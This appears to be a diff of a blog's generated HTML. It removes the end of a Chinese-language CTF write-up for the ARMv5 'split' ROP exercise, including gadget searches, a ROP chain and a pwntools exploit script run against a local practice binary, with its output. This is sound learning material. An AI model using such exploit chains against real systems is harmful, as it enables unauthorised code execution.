-<li>需要从栈上将字符串设置到寄存器R0</li>
-<li>需要从栈上将system函数的地址设置到PC寄存器上</li>
-</ol>
-<p>使用ROPGadget没有找到直接从栈上POP数据到R0的指令，因此考虑先将字符串地址从栈上取出到另外一个寄存器，然后再mov到R0上。只找到如下的一条：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary split_armv5 | grep &quot;mov&quot; | grep &quot;r0&quot;</span><br><span class="line">0x00010558 : mov r0, r3 ; pop &#123;fp, pc&#125;</span><br></pre></td></tr></table></figure>
-
-<p>那么继续找可以从栈上恢复数据到R3寄存器的指令，挺多的，找了如下的两条做参考：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary split_armv5 | grep &quot;pop&quot; | grep &quot;r3&quot;</span><br><span class="line">.fini:00010658                 POP     &#123;R3,PC&#125;</span><br><span class="line">.init:000103A4                 POP     &#123;R3,PC&#125;</span><br></pre></td></tr></table></figure>
-
-<p>ROP编写如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(<span class="number">0x00010658</span>) <span class="comment"># POP     &#123;R3,PC&#125;</span></span><br><span class="line">rop += p32(字符串地址)   <span class="comment"># 字符串地址</span></span><br><span class="line">rop += p32(<span class="number">0x00010558</span>)  <span class="comment"># mov r0, r3 ; pop &#123;fp, pc&#125;</span></span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">rop += p32(system函数)</span><br></pre></td></tr></table></figure>
-<p>简单补充一下armel下批量POP的话，是先POP到序号小的寄存器。</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;./split_armv5&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;arm&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">pause()</span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(<span class="number">0x00010658</span>) <span class="comment"># POP     &#123;R3,PC&#125;</span></span><br><span class="line">rop += p32(<span class="number">0x0002103C</span>) <span class="comment"># 字符串地址</span></span><br><span class="line">rop += p32(<span class="number">0x00010558</span>) <span class="comment"># mov r0, r3 ; pop &#123;fp, pc&#125;</span></span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x000103EC</span>) <span class="comment"># system函数地址</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
-<p>利用结果如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/utest/rop_practice/armv5/split_armv5/split_armv5&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br><span class="line">[+] Opening connection to 0.0.0.0 on port 8888: Done</span><br><span class="line">[*] Paused (press any to continue)</span><br><span class="line">b&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;&#x27;</span><br><span class="line">[*] Closed connection to 0.0.0.0 port 8888</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1344,14 +1388,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-count">40</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
